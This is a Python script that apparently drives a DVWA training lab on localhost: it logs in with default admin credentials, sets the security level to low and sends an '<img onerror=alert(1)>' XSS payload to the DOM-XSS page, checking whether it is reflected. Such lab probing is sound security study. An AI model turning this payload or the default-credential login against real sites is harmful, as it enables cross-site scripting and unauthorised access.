import re

import requests


def extract_user_token(html: str) -> str:
    m = re.search(r"name='user_token'\s+value='([^']+)'", html or "")
    if m:
        return m.group(1)
    m = re.search(r'name=\"user_token\"\s+value=\"([^\"]+)\"', html or "")
    return m.group(1) if m else ""


def main() -> None:
    base = "http://127.0.0.1:7777"
    payload = "<img src=x onerror=alert(1)>"
    s = requests.Session()

    login = s.get(f"{base}/login.php", timeout=10)
    token = extract_user_token(login.text)
    s.post(
        f"{base}/login.php",
        data={"username": "admin", "password": "password", "Login": "Login", "user_token": token},
        allow_redirects=True,
        timeout=10,
    )

    sec = s.get(f"{base}/security.php", timeout=10)
    sec_token = extract_user_token(sec.text)
    s.post(
        f"{base}/security.php",
        data={"security": "low", "seclev_submit": "Submit", "user_token": sec_token},
        allow_redirects=True,
        timeout=10,
    )

    r = s.get(f"{base}/vulnerabilities/xss_d/?default={requests.utils.quote(payload)}", timeout=10)
    body = r.text or ""
    print("status", r.status_code, "len", len(body))
    print("payload_in_body", payload in body)
    print("alert1_in_body", "alert(1)" in body)
    encoded = requests.utils.quote(payload)
    print("encoded_payload_in_body", encoded in body)
    print("onerror_in_body", "onerror" in body.lower())
    print("default_param_in_body", "default=" in body)
    vib = [m.group(0) for m in re.finditer(r"Vulnerability:[^\\n<]{0,80}", body)]
    print("vuln_snippets", vib[:5])
    print("markers", ("Vulnerability:" in body) and ("DOM" in body))


if __name__ == "__main__":
    main()

